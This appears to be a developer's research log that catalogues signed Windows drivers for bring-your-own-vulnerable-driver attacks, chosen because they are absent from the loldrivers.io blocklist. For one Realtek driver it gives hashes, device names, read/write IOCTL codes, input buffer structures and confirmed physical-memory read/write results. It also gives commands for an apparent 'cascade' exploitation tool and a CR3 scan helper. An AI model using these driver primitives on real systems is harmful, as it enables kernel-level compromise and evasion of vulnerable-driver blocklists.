# Novel BYOVD Driver Candidates

**Generated:** 2026-09-08  
**Updated:** 2026-09-09  
**Criteria:** MmMapIoSpace, NOT on loldrivers.io, valid code signature

---

## Summary

| Driver | Status | Backend | loldrivers |
|--------|--------|---------|------------|
| RtsPpx.sys | **CONFIRMED WORKING** | `--driver-type rtsppx` | NOT listed |
| RwDrv.sys | Ready to test | `--driver-type rwdrv` | Novel hash |
| RMDRVSYS.sys | Needs RE | Not implemented | NOT listed |

---

## Candidate 1: RtsPpx.sys (Realtek) — CONFIRMED

| Field | Value |
|-------|-------|
| **Hash** | `0259226bce1a413201617e7ea662e7871c4cdd4fb24f8e13dae93fbc28d3bbef` |
| **Size** | 27,208 bytes |
| **Device** | `\\.\RtsPpx` |
| **IOCTLs** | `0x222000` (read), `0x222008` (write) |
| **Signer** | Realtek Semiconductor Corp (DigiCert, 2020-2022) |
| **loldrivers** | **NOT LISTED** |
| **Cascade backend** | `--driver-type rtsppx` |
| **Status** | **CONFIRMED WORKING** |

### Test Results (2026-09-08, VM 125 - Win11 22H2 x64)

| Test | Result | Details |
|------|--------|---------|
| Driver Load | PASS | No Secure Boot/WDAC blocks |
| Physical READ | PASS | Tested 0x1000, 0xFFFF0 (BIOS) |
| Physical WRITE | PASS | Modified byte, verified, restored |
| Device Open | PASS | `\\.\RtsPpx` handle acquired |

### Requirements
- Windows 11 22H2 x64 (tested)
- VBS/HVCI disabled
- Secure Boot disabled
- Vulnerable Driver Blocklist disabled

### Input Buffer Structure
```c
#pragma pack(push,1)
struct RtsPpx_ReadReq {
    QWORD physAddr;   // Physical address (BAR)
    DWORD busNum;     // Set to 0
    DWORD devNum;     // Set to 0
    DWORD funNum;     // Set to 0
    DWORD offset;     // Set to 0
};  // 24 bytes

struct RtsPpx_WriteReq {
    QWORD physAddr;
    DWORD busNum;
    DWORD devNum;
    DWORD funNum;
    DWORD offset;
    BYTE  data;       // Single byte to write
};  // 25 bytes
#pragma pack(pop)
```

### Usage
```cmd
cascade.exe --driver RtsPpx.sys --driver-type rtsppx --test-rw --verbose
```

---

## Candidate 2: RwDrv.sys (lab-z) — Novel Hash

| Field | Value |
|-------|-------|
| **Hash** | `6c32b33f0a2ebf79b8d5037abdb59a85b570112f943410f3f3d8a0489337f3da` |
| **Size** | 21,936 bytes |
| **Device** | `\\.\fmem3` |
| **IOCTLs** | `0x80002000` (read), `0x80002004` (write) |
| **PDB** | `d:\src\rw\rwxe3\rw\driver\objfre_win7_amd64\amd64\RwDrv.pdb` |
| **Signer** | RwDrv(lab-z), DigiCert timestamped 2022 |
| **loldrivers** | RwDrv family listed, **this hash NOT in known samples** |
| **Cascade backend** | `--driver-type rwdrv` |
| **Status** | Backend implemented, ready to test |

### Notes
- From RWEverything tool family
- Uses same IOCTL pattern as AsmIo (0x80002000/0x80002004)
- Has MmMapIoSpace + MmGetPhysicalAddress
- Different hash from all 7 RwDrv samples on loldrivers

### Usage
```cmd
cascade.exe --driver RwDrv.sys --driver-type rwdrv --test-rw --verbose
```

---

## Candidate 3: RMDRVSYS.sys (ADLINK Technology)

| Field | Value |
|-------|-------|
| **Hash** | `b24f0d3db0a24214c98260b89a039aa6af9eb4d1f90a412bbe4406ef5becf195` |
| **Size** | 20,840 bytes |
| **Device** | `\\.\RMDRVSYS` |
| **PDB** | `c:\jenkins\...\adrmsrv_sys\amd64\RMDRVSYS.pdb` |
| **Signer** | ADLINK TECHNOLOGY INC (DigiCert, **valid 2023-2026**) |
| **loldrivers** | **NOT LISTED** |
| **Cascade backend** | Not implemented |
| **Status** | Needs Ghidra RE (see `RMDRVSYS-RE-ANALYSIS.md`) |

### Notes
- PXI resource manager driver for test equipment
- Has MmMapIoSpace + MmUnmapIoSpace + HalGetBusDataByOffset
- From Teradyne/ADLINK industrial equipment toolchain
- Certificate valid until 2026
- Potential IOCTL base: 0x8000XXXX (found 0x80000010 reference)
- Requires Ghidra disassembly to identify dispatch table and buffer structures

---

## Rejected Candidates

| Driver | Reason |
|--------|--------|
| Spio.sys | Uses IoRegisterDeviceInterface (PnP), not static device |
| phymem.sys | **Not signed** - cannot load |
| NTIOLib.sys | Physical address whitelist (MMIO regions only) |
| iOCdrv.sys | 40-entry port/address whitelist blocks arbitrary access |

---

## Technical Notes

### CR3 Bootstrap Safe Address Ranges
The cascade CR3 scan was updated to skip problematic memory regions:

```c
static bool IsSafeAddr(QWORD pa) {
    if (pa < 0x1000) return false;                    // First page
    if (pa >= 0xA0000 && pa < 0x100000) return false; // Legacy video/ROM
    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return false; // PCI MMIO
    if (pa >= 0xFEC00000 && pa < 0xFEF00000) return false; // APIC/HPET
    if (pa >= 0xFF000000) return false;               // Firmware ROM
    return true;
}
```

### Architecture Requirements
- All drivers in bigDrivers are **x86-64**
- Cannot run on ARM64 Windows (no kernel emulation)
- VM 125 (Win11 22H2 x64) used for testing
- VM 126 was ARM64 - caused "error 1275" failures

---

## Files

| File | Description |
|------|-------------|
| `/bigDrivers/0259226b...ef.sys` | RtsPpx.sys (Realtek) |
| `/bigDrivers/6c32b33f...da.sys` | RwDrv.sys (lab-z) |
| `/bigDrivers/b24f0d3d...95.sys` | RMDRVSYS.sys (ADLINK) |
| `src/cascade.cpp` | All backends implemented |
| `docs/RtsPpx-RE-ANALYSIS.md` | RtsPpx full RE documentation |
| `docs/RMDRVSYS-RE-ANALYSIS.md` | RMDRVSYS preliminary RE analysis |
